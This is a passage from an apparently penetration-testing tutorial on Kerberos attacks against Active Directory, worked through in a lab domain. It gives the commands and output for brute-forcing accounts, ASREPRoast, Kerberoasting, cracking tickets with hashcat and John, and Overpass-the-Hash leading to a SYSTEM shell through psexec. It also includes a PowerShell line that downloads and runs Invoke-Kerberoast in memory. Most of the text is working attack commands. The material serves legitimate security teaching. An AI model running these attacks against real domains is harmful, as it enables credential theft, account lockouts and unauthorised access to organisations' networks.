required, which can be useful to perform an ASREPRoast attack.</li></ul><div>However, by carrying out a brute-force attack it is also possible to <strong>block user accounts</strong>. Thus, this technique should be used carefully.</div></div><h4>From Linux</h4><p>The script <a href="https://github.com/TarlogicSecurity/kerbrute">kerbrute.py</a> can be used to perform a brute-force attack by using Kerberos from a Linux computer:</p><pre><code class="language-shell">root@kali:kerbrute# python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
[*] Valid user =&gt; triceratops
[*] Valid user =&gt; velociraptor [NOT PREAUTH]
[*] Valid user =&gt; trex
[*] Blocked/Disabled user =&gt; trex
[*] Stupendous =&gt; velociraptor:Sm4rtSp33d
[*] Saved TGT in velociraptor.ccache
[*] Saved discovered passwords in jurassic_passwords.txt
</code></pre><p>Once finished, a file with the discovered passwords is generated. Besides, the obtained TGTs tickets are stored for future use.</p><h4>From Windows</h4><p>In the case of Windows, the module <em>brute</em> of <a href="https://github.com/Zer1t0/Rubeus">Rubeus</a>, which is available on a fork of <a href="https://github.com/Zer1t0/Rubeus">Zer1t0</a>, can be used to launch a brute-force attack like the following:</p><pre><code class="language-shell">PS C:\Users\user01&gt; .\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:jurassic.park /outfile:jurassic_passwords.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2

[+] Valid user =&gt; velociraptor
[+] Valid user =&gt; trex
[+] Valid user =&gt; triceratops
[+] STUPENDOUS =&gt; triceratops:Sh4rpH0rns
[*] Saved TGT into triceratops.kirbi
</code></pre><p>In the same way as in the Linux scenario, the discovered credentials are saved in the output file alongside valid TGTs.</p><h3>ASREPRoast</h3><p>The
 ASREPRoast attack looks for users without Kerberos pre-authentication 
required. That means that anyone can send an AS_REQ request to the KDC 
on behalf of any of those users, and receive an AS_REP message. This 
last kind of message contains a chunk of data encrypted with the 
original user key, derived from its password. Then, by using this 
message, the user password could be cracked offline. More detail in <a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">Kerberos theory</a>.</p><p>Furthermore,
 no domain account is needed to perform this attack, only connection to 
the KDC. However, with a domain account, an LDAP query can be used to 
retrieve users without Kerberos pre-authentication in the domain. 
Otherwise usernames have to be guessed.</p><p>In order to retrieve user accounts without Kerberos pre-authentication, the following LDAP filter can be used:&nbsp;<em>(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))</em> . Parameter <em>samAccountType&nbsp;</em>allows to request user accounts only, without including computer accounts, and&nbsp;<em>userAccountControl&nbsp;</em>filters by Kerberos pre-authentication in this case.</p><h4>From Linux</h4><p>The script <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">GetNPUsers.py</a>
 can be used from a Linux machine in order to harvest the non-preauth 
AS_REP responses. The following commands allow to use a given username 
list or query to obtain a list of users by providing domain credentials:</p><pre><code class="language-shell">root@kali:impacket-examples# python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[-] User trex doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User triceratops doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
root@kali:impacket-examples# cat hashes.asreproast 
$krb5asrep$23$velociraptor@JURASSIC.PARK:7c2e70d3d46b4794b9549bba5c6b728e$599da4e9b7823dbc8432c188c0cf14151df3530601ad57ee0bc2730e0f10d3f1552b3552cee9431cf3f1b119d099d3cead7ea38bc29d5d83074035a2e1d7de5fa17c9925c75aac2717f49baae54958ec289301a1c23ca2ec1c5b5be4a495215d42e9cbb2feb8b7f58fb28151ac6ecb0684c27f14ecc35835aecc3eec1ec3056d831dd518f35103fd970f6d082da0ebaf51775afa8777f783898a1fa2cea7493767024ab3688ec4fe00e3d08a7fb20a32c2abf8bdf66c9c42f49576ae9671400be01b6156b4677be4c79d807ba61f4703d9acda0e66befc5b442660ac638983680ffa3ada7eacabad0841c9aee586
</code></pre><pre><code class="language-shell">root@kali:impacket-examples# python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

Name          MemberOf                                       PasswordLastSet      LastLogon            UAC      
------------  ---------------------------------------------  -------------------  -------------------  --------
velociraptor  CN=Domain Admins,CN=Users,DC=jurassic,DC=park  2019-02-27 17:12:12  2019-03-18 11:44:04  0x410200 



root@kali:impacket-examples# cat hashes.asreproast 
$krb5asrep$23$velociraptor@JURASSIC.PARK:6602e01d59b4eeba815ab467194a9de4$b13a0e139b1daa46a457b3fa948c22cbbaad75a94c2b37064d757185d171c258e290210339d950b9245de6fa40a335986146a8c71c0b60f633b4c040141460a0a91737670f21caae6261ebde0151c06adceac22bfed84cb8c1f07948fb8e75b8a1d64c768c9e3f3a50d035ec03df643ea185648406b634b6fd673028e6e90ea429f57f9229b00f47f2bba2cdb7297d29b9f97a83d07c89dee7ea673340f64c443a213d5b9bbed969a68ca7a0ea41245b0fa985f64261803488b61821fbaedf43d50ea16075b2379bb354e4001d73dfd19cc8787b4bcd2bd9b542e0e2b1218ee8c16699c134ae5ec587afe0fd1880
</code></pre><p>After finishing the execution, the script will generate 
an output file with encoded AS_REP messages to crack using hashcat or 
John.</p><h4>From Windows</h4><p>Rubeus can be used to carry out this 
attack from a Windows machine. The following command will generate a 
file containing AS_REP messages of affected users:</p><pre><code class="language-shell">C:\Users\triceratops&gt;.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3

[*] Action: AS-REP roasting

[*] Using domain controller: Lab-WDC01.jurassic.park (10.200.220.2)
[*] Building AS-REQ (w/o preauth) for: 'jurassic.park\velociraptor'
[*] Connecting to 10.200.220.2:88
[*] Sent 170 bytes
[*] Received 1423 bytes
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\triceratops\hashes.asreproast

[*] Roasted hashes written to : C:\Users\triceratops\hashes.asreproast

C:\Users\triceratops&gt;type hashes.asreproast
$krb5asrep$23$velociraptor@jurassic.park:BBEC05D876E5133F5AB0CEDA07572FE0$4A826CD2123EBC266179A9009E867EAAC03D1C8C9880ACF76DCA4B5919F967E86DBB6CD475DA8EF5C83B1B8388D22DA005BA10D5CB4D10F3C3F44C918ACD5843660C4FF5C678E635F7751A109524D693DB29BF75A5F0995B41CD35600B969FE371F77AD13F48604DFAB87253D324E8F53C267A2299D2450245D317D319A4FD424B42F815B79E2DD16C58AB2A2C106EB6995AFF70C8E889D8F170B35E78993157B3B3D13DCCE18A720BC5810C474CBC95C07B5FFCEE5EE06442FDB6244C33EECA4BFCD4F6C051A5F00C40A837A9644ADA70A381A85089F05CFB5E5F03AB0C7525BBA6AEAF9DA3554D3D700DD54760
</code></pre><p>Once executed, Rubeus should have generated a file with one AS_REP per line. This file can be used to feed Hashcat or John.</p><h4>Cracking the AS_REP</h4><p>Finally,
 to crack the harvested AS_REP messages, Hashcat or John can be used. In
 this case a dictionary attack will be performed, but a variety of 
cracking techniques can be applied.</p><p>Hashcat command:</p><pre><code class="language-shell">root@kali:impacket-examples# hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-4210H CPU @ 2.90GHz, 2961/2961 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=18200 -D _unroll'
Dictionary cache hit:
* Filename..: passwords_kerb.txt
* Passwords.: 3
* Bytes.....: 25
* Keyspace..: 3

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

$krb5asrep$23$velociraptor@jurassic.park:bbec05d876e5133f5ab0ceda07572fe0$4a826cd2123ebc266179a9009e867eaac03d1c8c9880acf76dca4b5919f967e86dbb6cd475da8ef5c83b1b8388d22da005ba10d5cb4d10f3c3f44c918acd5843660c4ff5c678e635f7751a109524d693db29bf75a5f0995b41cd35600b969fe371f77ad13f48604dfab87253d324e8f53c267a2299d2450245d317d319a4fd424b42f815b79e2dd16c58ab2a2c106eb6995aff70c8e889d8f170b35e78993157b3b3d13dcce18a720bc5810c474cbc95c07b5ffcee5ee06442fdb6244c33eeca4bfcd4f6c051a5f00c40a837a9644ada70a381a85089f05cfb5e5f03ab0c7525bba6aeaf9da3554d3d700dd54760:Sm4rtSp33d
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$velociraptor@jurassic.park:bbec05d876...d54760
Time.Started.....: Tue Mar  5 11:15:47 2019 (1 sec)
Time.Estimated...: Tue Mar  5 11:15:48 2019 (0 secs)
Guess.Base.......: File (passwords_kerb.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        4 H/s (0.18ms) @ Accel:64 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3/3 (100.00%)
Rejected.........: 0/3 (0.00%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: above1 -&gt; below1

Started: Tue Mar  5 11:12:26 2019
Stopped: Tue Mar  5 11:15:48 2019
</code></pre><p>John command:</p><pre><code class="language-shell">root@kali:kali# john --wordlist=passwords_kerb.txt hashes.asreproast
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 1 candidates left, minimum 16 needed for performance.
Sm4rtSp33d       ($krb5asrep$velociraptor@jurassic.park)
1g 0:00:00:00 DONE (2019-03-07 17:16) 20.00g/s 20.00p/s 20.00c/s 20.00C/s Sm4rtSp33d
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre><p>In this case, luck is on our side, and the user password was contained in the dictionary.</p><h3>Kerberoasting</h3><p>The
 goal of Kerberoasting is to harvest TGS tickets for services that run 
on behalf of user accounts in the AD, not computer accounts. Thus, part 
of these TGS tickets is encrypted with keys derived from user passwords.
 As a consequence, their credentials could be cracked offline. More 
detail in <a href="https://www.tarlogic.com/en/blog/how-kerberos-works/">Kerberos theory</a>.</p><p>Therefore,
 to perform Kerberoasting, only a domain account that can request for 
TGSs is necessary, which is anyone since no special privileges are 
required.</p><p>In order to retrieve user accounts which have associated services, the following LDAP filter can be used: <em>(&amp;(samAccountType=805306368)(servicePrincipalName=*))</em>. Parameter <em>samAccountType</em> allows filtering out the computer accounts, and <em>servicePrincipalName=*</em> filters by accounts with at least one service.</p><h4>From Linux</h4><p>From a Linux machine, it is possible retrieve all the TGS’s by using the impacket example <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs.py</a>. The command required to perform the attack and save the TGS’s into a file is the following:</p><pre><code class="language-shell">root@kali:impacket-examples# python GetUserSPNs.py jurassic.park/triceratops:Sh4rpH0rns -outputfile hashes.kerberoast
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

ServicePrincipalName  Name          MemberOf  PasswordLastSet      LastLogon           
--------------------  ------------  --------  -------------------  -------------------
cloner/labwws02       velociraptor            2019-02-27 17:12:12  2019-03-05 09:35:27 



root@kali:impacket-examples# cat hashes.kerberoast 
$krb5tgs$23$*velociraptor$JURASSIC.PARK$cloner/labwws02*$b127187aceb93774a985bb1e528da85c$75cc3037a244f3422d6129bba79f79c67e79aca81b0b7dd551019424005abcfb8e232600fa968de2dcc9f10a44d13c17ac2be66bbb2640187dc174d81d9ebad0d691b36b3cbf4ca457678861748e2ab950f3066e0f50489415b934e4f6a2f2b7d8845cfd6a74279bad50da8c363174a07e51cbf39a2dd88bd74f1c839373cd9370ec1e2b7ebc5d6d05d49d34a75925d5983ab4849e211e57e93666f1fe9663b53620d2710e15f2c70837a4983db19c345b93f790244899b847d186197c37e966fc239ec750f91bd317fc2388ca421895052e2d57f742ab45c59275e95dfbb855ff11e5e893631164f6053ca0a6162c6b1be3ccdeb7fe2ce3a8634411b2b16ef03f558a5e0156bb8270ece6cf6b516af8172aa6071904d493c6fdf91738781371b68dfd9b4e1c2d6bcef3d665504194a703b08615d1b9c57ac794c37ab44dc2d57dff9677b0168aa7c078b190dddb2091ab63ca85868944cdbb4229a7a291028f193f94cb5c9a43c55b006cdd35df241b49d5464d3c05d5b7ec9eecd843335e45642892333b9760d06bc445d02558c2c30a2648a1018bc8493b8f73a6b0c07ffd052434239f0463b2344363656d6b6640efdc3e10fab04b99fc1f1487942c2b2c9ca7e89447aab3b1fb5adcb4b820d842a2ec713b788358e5c14d8ac3f0070058e6453297d4fb9538680ab152ce4ed3168cc6a58cc1c753b15d5de7fb98132ac3eec602ad611e8e03ed1c00c2bfa3b5bec1ea93f24b68b54fe48726f4e650dba34b3c4696b5f5e743cb5ace4b9b073dc718070d06e8f872abef2d4040350cd9e09091da47ab2fcef2e0d873afdcb9d7cf2236131f312d4e23004eb598efa064b871af82e618c31a2e82d28bc635ac3cbd000d725dd53217fb484178de3cd9bf4d20819c30c189ccc2ae349a333b628c6d41d01163b918def5ba089ac2cc6ff673dd64e1c2fef25fb599e009c1eca8e9e06cebc61fb0e7fc6922bc3edbdc60dd85a3f5b7412e8e46db80b55f577cc682892e66987a0e920872292a5cdd0f1a11fcc294461ccf86a53e75c9c8b0f9688919b4484986b7bcfb7612b117f98f5b0f4bf44ef0ad07245883ced1045b215a137d50a54f45a67168e6bed3dcb41f25b8ac307a4f3923d1545f0f6f1593db0a8b3032a3837b5c1715656e73c3ba0102e76dbbf47388bb5d1c334fc50598a57914a77c4c11059fe1b07b6342286ec2f6f38e7a5a946f40b7de01707f9681228904cb04434063c3dc7a6d26f301664514551ee20b69eb76d2a3f8fbc45b0d9cf9d236f8ac880c75b140dc471e6044b1c85af0e26393e057c5357f8ef223e845676e963eba6540d2cbee90cbb6d2422e9b1e34e6b2989a752c09b86d302219a45cd219f3fdf243f9b5c7002997daeff03f7cd437
</code></pre><p>Once finished, a file with a crackable TGS per line 
should have been generated as output. This file can be used to feed 
Hashcat or John in order to crack its TGS’s.</p><h4>From Windows</h4><p>Likewise,
 Kerberoasting can be performed from a Windows machine with several 
tools such as Rubeus or Invoke-Kerberoast from Empire project. In this 
case, tools are launched from the context of a logged user inside a 
domain workstation. The commands are the following:</p><pre><code class="language-shell">C:\Users\triceratops&gt;.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3

[*] Action: Kerberoasting

[*] SamAccountName         : velociraptor
[*] DistinguishedName      : CN=velociraptor,OU=Usuarios,DC=jurassic,DC=park
[*] ServicePrincipalName   : cloner/labwws02
[*] Hash written to C:\Users\triceratops\hashes.kerberoast

[*] Roasted hashes written to : C:\Users\triceratops\hashes.kerberoast

C:\Users\triceratops&gt;type hashes.kerberoast
$krb5tgs$23$*$jurassic.park$cloner/labwws02*$60B2E176B7A641FD663BF1B8D0B6E106$069B2ACA38B73BFCAC56526DBAEF743F4981980CD213DD9FE7D41D3AB3F3E521273C70D9CA681319F690C5BFAE627B423D3FBAD20D7EDE8E1AF930B5AEFCC2657B4A8B0BD5DCD9B51560E78478A9A7616C0CB675FDC501828CCE58206542D48D48B4A1DCE61BDCB9705094DE1D16536526E04E5AE84567407DA665868E33DB26CD763DCEBDD8F6801494A9F6E3ADE8F63C7D197D1AE66345A9635FE5E7C2D35A9DC4885DD2C6699CE8C00D71B518DC6BA8B87F525AEC635881245F20E7ECE150B4D4223C19960AFF417FB4C053EA6FA3B86938FCA1F1A781E3F36FAB9EE8909422CCE440453F0E3A2D23DED7861BA919BC8567C6DC1F77817F1E44181783EC3BA76CF688A841FBD6F9B02B2BD2D4A22BB489808F04CAAA87D025812EF11B39FEC605485EB875D57F4D09623B3108638816E6D2DB81F280635B29FD4BD08A9C8AAE72571B61E81274C56DCAB8AE13C2EEFA3AF2DD4084A96CA84F336987CD765C2D23FB957EE378136ED42BBFDE1DE8361BF933B51370D7AF07A3A939C3FEEC62ADC4A884EE52A296DEF9402F732D57F04FB93FC296B8F5031FA852403D6AE7211648693C4CD0C47847C07E869D1FB41B627B1928EC929409EEE0B1CE67BB55CEA069A26809E8347A3BEA34AB9EC4F78051D40CCD9AB1C5AF655165F86E0185B72E01643854710E322A2722BDEAABA317A1ECD78096E3D5A51831A57F505B861AEEB9B2207CA2D7FBCE47847C3D3A1CB9D5C2B931BC532B220434550D83A82F63B26B918E189C38D7D979AC05D34043ECEDCA09CEFDB3065A8BE2717E84FC325373A7B778AA4325D7F0458AC7A84196DA7752BEFE0ED9A0830ECB60BA4F3EC5F0A2FB3BA482DD9F947C8A667CCC54013C01D15E0AB41CC08A140389028461B16E38CCD85542F8B53E1AC4CB4E8F6CE2EFC9ECDABD6AED2716C17221791D620E333359B39A0D6720FD6167A2D03A74B4C7FD549EC9169AC3103A4EBD9BF8F5754EF013411802524A5F8DA6FE7FBCD219D2193891C9026513AEB751D6D3707253929F43F6A40012E2463002465F888E6F15C4CE264DB88650D503431A3D1FC58321ADB65F7BC69E2E95562A81FFE3A633BF4AC27B85CE2CB49A0EF19FDA1A51074B898D21B94FA91F7092BE9B22BDFBA09829FC1B95187AE8CB2BBAB3C1E3ECF5835723C2858862A0BEF32001AC461C0FE496029B3E7E6827E0991F6CF3F6D658F4AA8DDDDC097CC2B12038DF8112833DA052D0ED2D42D2FD93DA13FFEE3831F57956DFF6FA0C9E573862B1D4F2AC3344F7320F1FBCB5F9773EEE0F091829052CC5F31CECBD0E468914C70B9F03CA056A53E449AE85734B1C43D57FEEFC5576672C82D47F14A168E9A2FFDE715955B2749A01DE174CB32C4D8F7477A087E717379D9599E50997D8619D8F1F2DB268E5D89A9DA13E2B61C15E97159740766C4415B5F46C754A2C2C9500092BD1AF88F1C1C4D5DC4A4F5078F691148D448DBCD94549F74A2312921293427891DEF1C0754FA6AA3633141BE8D885703279C62EECE474A366FC9B8C8A4A5DAF98FF
</code></pre><p>Another way to accomplish Kerberoast is to use the powershell script <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast</a> from <a href="https://github.com/EmpireProject/Empire">Empire</a> project, which can be loaded directly into memory:</p><pre><code class="language-shell">PS C:\Users\triceratops&gt; iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
PS C:\Users\triceratops&gt; Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
</code></pre><p>In the same way as impacket, these tools create output 
files with one crackable TGS per line, which can be used to feed Hashcat
 or John.</p><h4>Cracking the TGSs</h4><p>In this section, cracking 
examples of both Hashcat and John will be shown. However, there are 
several different cracking methods which can be applied in this 
situation. Next, a dictionary attack will be performed (the dictionary 
contains the password for demonstration purposes).</p><p>Hashcat command:</p><pre><code class="language-shell">root@kali:impacket-examples# hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i5-4210H CPU @ 2.90GHz, 2961/2961 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts &gt; length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=13100 -D _unroll'
* Device #1: Kernel m13100_a0-pure.43809ab0.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: passwords_kerb.txt
* Passwords.: 3
* Bytes.....: 25
* Keyspace..: 3

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

$krb5tgs$23$*velociraptor$jurassic.park$cloner/labwws02*$60b2e176b7a641fd663bf1b8d0b6e106$069b2aca38b73bfcac56526dbaef743f4981980cd213dd9fe7d41d3ab3f3e521273c70d9ca681319f690c5bfae627b423d3fbad20d7ede8e1af930b5aefcc2657b4a8b0bd5dcd9b51560e78478a9a7616c0cb675fdc501828cce58206542d48d48b4a1dce61bdcb9705094de1d16536526e04e5ae84567407da665868e33db26cd763dcebdd8f6801494a9f6e3ade8f63c7d197d1ae66345a9635fe5e7c2d35a9dc4885dd2c6699ce8c00d71b518dc6ba8b87f525aec635881245f20e7ece150b4d4223c19960aff417fb4c053ea6fa3b86938fca1f1a781e3f36fab9ee8909422cce440453f0e3a2d23ded7861ba919bc8567c6dc1f77817f1e44181783ec3ba76cf688a841fbd6f9b02b2bd2d4a22bb489808f04caaa87d025812ef11b39fec605485eb875d57f4d09623b3108638816e6d2db81f280635b29fd4bd08a9c8aae72571b61e81274c56dcab8ae13c2eefa3af2dd4084a96ca84f336987cd765c2d23fb957ee378136ed42bbfde1de8361bf933b51370d7af07a3a939c3feec62adc4a884ee52a296def9402f732d57f04fb93fc296b8f5031fa852403d6ae7211648693c4cd0c47847c07e869d1fb41b627b1928ec929409eee0b1ce67bb55cea069a26809e8347a3bea34ab9ec4f78051d40ccd9ab1c5af655165f86e0185b72e01643854710e322a2722bdeaaba317a1ecd78096e3d5a51831a57f505b861aeeb9b2207ca2d7fbce47847c3d3a1cb9d5c2b931bc532b220434550d83a82f63b26b918e189c38d7d979ac05d34043ecedca09cefdb3065a8be2717e84fc325373a7b778aa4325d7f0458ac7a84196da7752befe0ed9a0830ecb60ba4f3ec5f0a2fb3ba482dd9f947c8a667ccc54013c01d15e0ab41cc08a140389028461b16e38ccd85542f8b53e1ac4cb4e8f6ce2efc9ecdabd6aed2716c17221791d620e333359b39a0d6720fd6167a2d03a74b4c7fd549ec9169ac3103a4ebd9bf8f5754ef013411802524a5f8da6fe7fbcd219d2193891c9026513aeb751d6d3707253929f43f6a40012e2463002465f888e6f15c4ce264db88650d503431a3d1fc58321adb65f7bc69e2e95562a81ffe3a633bf4ac27b85ce2cb49a0ef19fda1a51074b898d21b94fa91f7092be9b22bdfba09829fc1b95187ae8cb2bbab3c1e3ecf5835723c2858862a0bef32001ac461c0fe496029b3e7e6827e0991f6cf3f6d658f4aa8ddddc097cc2b12038df8112833da052d0ed2d42d2fd93da13ffee3831f57956dff6fa0c9e573862b1d4f2ac3344f7320f1fbcb5f9773eee0f091829052cc5f31cecbd0e468914c70b9f03ca056a53e449ae85734b1c43d57feefc5576672c82d47f14a168e9a2ffde715955b2749a01de174cb32c4d8f7477a087e717379d9599e50997d8619d8f1f2db268e5d89a9da13e2b61c15e97159740766c4415b5f46c754a2c2c9500092bd1af88f1c1c4d5dc4a4f5078f691148d448dbcd94549f74a2312921293427891def1c0754fa6aa3633141be8d885703279c62eece474a366fc9b8c8a4a5daf98ff:Sm4rtSp33d
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*velociraptor$jurassic.park$cloner/labw...af98ff
Time.Started.....: Tue Mar  5 10:46:34 2019 (1 sec)
Time.Estimated...: Tue Mar  5 10:46:35 2019 (0 secs)
Guess.Base.......: File (passwords_kerb.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        4 H/s (0.16ms) @ Accel:64 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3/3 (100.00%)
Rejected.........: 0/3 (0.00%)
Restore.Point....: 0/3 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: above1 -&gt; below1

Started: Tue Mar  5 10:42:51 2019
Stopped: Tue Mar  5 10:46:35 2019
</code></pre><p>Due to encoding while using hashcat, a problem raised. The tool displays an error similar to <em>Byte Order Mark (BOM) was detected</em>,
 due to an input file encoded with Unicode (which is common in Windows 
output files) instead of ASCII. In order to solve this issue, the tool <em>dos2unix</em> can be used to convert the file encoding to the correct one.</p><p>John command:</p><pre><code class="language-shell">root@kali:impacket-examples# john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sm4rtSp33d       (?)
1g 0:00:00:00 DONE (2019-03-05 10:53) 50.00g/s 150.0p/s 150.0c/s 150.0C/s above1..below1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre><p>John was not able to show the username alongside the cracked password, instead, it displayed the symbol <em>(?)</em>. While this is enough in the case of just one TGS, it can get pretty annoying if several are going to be cracked.</p><p>After all, as shown above, it was possible to crack the password by using the correct dictionary with both tools.</p><h3>Overpass The Hash/Pass The Key (PTK)</h3><p>This
 attack aims to use user NTLM hash to request Kerberos tickets, as an 
alternative to the common Pass The Hash over NTLM protocol. Therefore, 
this could be especially useful in networks where NTLM protocol is 
disabled and only Kerberos is allowed as authentication protocol.</p><p>In
 order to perform this attack, the NTLM hash (or password) of the target
 user account is needed. Thus, once a user hash is obtained, a TGT can 
be requested for that account. Finally, it is possible to access any 
service or machine where the user account has permissions.</p><h4>From Linux</h4><p>From
 a Linux perspective, impacket can be used in order to perform this 
attack. Thus, the commands required for that purpose are the following:</p><pre><code class="language-shell">root@kali:impacket-examples# python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Saving ticket in velociraptor.ccache
root@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
root@kali:impacket-examples# python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Requesting shares on labwws02.jurassic.park.....
[*] Found writable share ADMIN$
[*] Uploading file yuiQeOUk.exe
[*] Opening SVCManager on labwws02.jurassic.park.....
[*] Creating service sBGq on labwws02.jurassic.park.....
[*] Starting service sBGq.....
[!] Press help for extra shell commands
Microsoft Windows [Versión 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre><p>After generating and using the TGT, finally a shell is 
launched. The requested TGT can also be used with other impacket 
examples with parameter <em>-k</em>, and even with other tools (as 
smbexec.py or wmiexec.py) thanks to it being written in a ccache file, 
